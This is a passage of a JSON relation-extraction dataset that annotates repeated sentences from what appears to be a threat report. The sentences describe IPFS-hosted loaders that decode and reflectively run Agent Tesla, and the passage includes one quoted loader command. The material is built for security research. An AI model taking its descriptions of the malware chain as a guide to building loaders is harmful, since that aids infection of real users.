"10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [144, 144], "name": "data", "pos": [4, 5], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [147, 147], "name": "IPFS gateway", "pos": [7, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "It", "pos": [0, 1], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [166, 166], "name": "executable", "pos": [9, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "PE32", "pos": [18, 19], "index": "15_0"}]], "labels": [{"r": "CO", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 4}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 4}, {"r": "EX", "evidence": [3, 4], "t": 3, "h": 4}, {"r": "ST", "evidence": [4], "h": 4, "t": 5}, {"r": "RF", "evidence": [4], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 4, "t": 6}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5, 6], "h": 6, "t": 11}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "h": 10, "t": 12}, {"r": "RF", "evidence": [6], "h": 10, "t": 12}, {"r": "WR", "evidence": [6, 7], "h": 10, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 13}, {"r": "WR", "evidence": [7], "h": 13, "t": 15}]}, {"title": "608-12", "sents": [["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "PE32 executable", "pos": [9, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "executable", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": ".NET", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "downloader", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "IPFS gateway", "pos": [9, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "data", "pos": [16, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "data", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "PE32 executable", "pos": [5, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "malware payload", "pos": [12, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "downloader", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [110, 110], "name": "data", "pos": [4, 5], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [113, 113], "name": "IPFS gateway", "pos": [7, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [132, 132], "name": "executable", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "PE32", "pos": [18, 19], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [143, 143], "name": "This", "pos": [0, 1], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "remote access trojan", "pos": [23, 26], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "RAT", "pos": [27, 28], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [173, 173], "name": "Agent Tesla", "pos": [30, 32], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "EX", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "ST", "evidence": [3], "h": 3, "t": 4}, {"r": "RF", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "CO", "evidence": [3, 4, 5], "h": 5, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "h": 9, "t": 11}, {"r": "RF", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 15}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 17}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 16}, {"r": "WR", "evidence": [6], "h": 12, "t": 14}]}, {"title": "608-13", "sents": [["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "PE32 executable", "pos": [9, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "executable", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": ".NET", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "downloader", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [42, 42], "name": "IPFS gateway", "pos": [9, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "data", "pos": [16, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "data", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "PE32 executable", "pos": [5, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "malware payload", "pos": [12, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "downloader", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "data", "pos": [4, 5], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [84, 84], "name": "IPFS gateway", "pos": [7, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [94, 94], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [103, 103], "name": "executable", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "PE32", "pos": [18, 19], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "This", "pos": [0, 1], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "remote access trojan", "pos": [23, 26], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "RAT", "pos": [27, 28], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [144, 144], "name": "Agent Tesla", "pos": [30, 32], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "payload", "pos": [7, 8], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "loader", "pos": [11, 12], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [167, 167], "name": "payload", "pos": [20, 21], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [171, 171], "name": "IPFS network", "pos": [24, 26], "index": "22_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 11}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 18}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 17}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 16}, {"r": "WR", "evidence": [5], "h": 12, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "t": 13, "h": 20}, {"r": "EX", "evidence": [7], "t": 19, "h": 20}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}, {"r": "ST", "evidence": [7], "h": 20, "t": 22}, {"r": "RF", "evidence": [7], "h": 20, "t": 22}]}, {"title": "608-14", "sents": [["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "executable", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": ".NET", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "downloader", "pos": [4, 5], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "IPFS gateway", "pos": [9, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "data", "pos": [16, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "data", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "PE32 executable", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "malware payload", "pos": [12, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "downloader", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "data", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [72, 72], "name": "IPFS gateway", "pos": [7, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "It", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "executable", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "PE32", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "This", "pos": [0, 1], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "remote access trojan", "pos": [23, 26], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "RAT", "pos": [27, 28], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "Agent Tesla", "pos": [30, 32], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [142, 142], "name": "payload", "pos": [7, 8], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [146, 146], "name": "loader", "pos": [11, 12], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "payload", "pos": [20, 21], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [159, 159], "name": "IPFS network", "pos": [24, 26], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "loader", "pos": [5, 6], "index": "22_0"}]], "labels": [{"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 17}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 16}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 15}, {"r": "WR", "evidence": [4], "h": 11, "t": 13}, {"r": "WR", "evidence": [4, 5, 6], "t": 12, "h": 19}, {"r": "EX", "evidence": [6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 22}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 22}, {"r": "ST", "evidence": [6, 7], "t": 21, "h": 22}, {"r": "RF", "evidence": [6, 7], "t": 21, "h": 22}, {"r": "ST", "evidence": [6, 7], "t": 21, "h": 22}, {"r": "RF", "evidence": [6, 7], "t": 21, "h": 22}]}, {"title": "608-15", "sents": [["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "downloader", "pos": [4, 5], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "IPFS gateway", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "data", "pos": [16, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "data", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "PE32 executable", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "malware payload", "pos": [12, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "downloader", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "data", "pos": [4, 5], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "IPFS gateway", "pos": [7, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "executable", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "PE32", "pos": [18, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [81, 81], "name": "This", "pos": [0, 1], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "remote access trojan", "pos": [23, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "RAT", "pos": [27, 28], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "Agent Tesla", "pos": [30, 32], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "payload", "pos": [7, 8], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "loader", "pos": [11, 12], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "payload", "pos": [20, 21], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [138, 138], "name": "IPFS network", "pos": [24, 26], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [151, 151], "name": "loader", "pos": [5, 6], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "loader", "pos": [4, 5], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [176, 176], "name": "% APPDATA %", "pos": [11, 14], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "malware", "pos": [32, 33], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [202, 202], "name": "Python 3.10", "pos": [37, 39], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [207, 207], "name": "software provider", "pos": [42, 44], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 15}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 12}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 14}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 13}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "WR", "evidence": [3, 4, 5], "t": 10, "h": 17}, {"r": "EX", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "ST", "evidence": [5], "h": 17, "t": 19}, {"r": "RF", "evidence": [5], "h": 17, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 20}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 20}, {"r": "ST", "evidence": [5, 6], "t": 19, "h": 20}, {"r": "RF", "evidence": [5, 6], "t": 19, "h": 20}, {"r": "ST", "evidence": [5, 6], "t": 19, "h": 20}, {"r": "RF", "evidence": [5, 6], "t": 19, "h": 20}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 21}, {"r": "RD", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}, {"r": "ST", "evidence": [7], "h": 23, "t": 25}, {"r": "RF", "evidence": [7], "h": 23, "t": 25}]}, {"title": "608-16", "sents": [["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "is", "then", "reflectively", "loaded", "and", "executed", ",", "launching", "the", "next", "stage", "of", "the", "infection", "process", ",", "which", "in", "this", "case", "is", "a", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "functioned", "as", "a", "loader", "and", "operated", "similarly", ",", "however", ",", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "in", "each", "cluster", "."], ["In", "most", "cases", ",", "the", "loader", "was", "not", "packed", ",", "but", "we", "did", "observe", "samples", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", "using", "the", "following", "command", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "NetworkThe", "malware", "then", "attempts", "to", "retrieve", "Python", "3.10", "from", "the", "legitimate", "software", "provider", "using", "the", "cURL", "command", "."], ["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "data", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "PE32 executable", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "malware payload", "pos": [12, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "downloader", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "data", "pos": [4, 5], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [22, 22], "name": "IPFS gateway", "pos": [7, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "executable", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "PE32", "pos": [18, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "This", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "remote access trojan", "pos": [23, 26], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "RAT", "pos": [27, 28], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "Agent Tesla", "pos": [30, 32], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "payload", "pos": [7, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "loader", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [105, 105], "name": "payload", "pos": [20, 21], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [109, 109], "name": "IPFS network", "pos": [24, 26], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [122, 122], "name": "loader", "pos": [5, 6], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [140, 140], "name": "loader", "pos": [4, 5], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [147, 147], "name": "% APPDATA %", "pos": [11, 14], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [168, 168], "name": "malware", "pos": [32, 33], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [173, 173], "name": "Python 3.10", "pos": [37, 39], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [178, 178], "name": "software provider", "pos": [42, 44], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 12}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 11}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 10}, {"r": "WR", "evidence": [2], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3, 4], "t": 7, "h": 14}, {"r": "EX", "evidence": 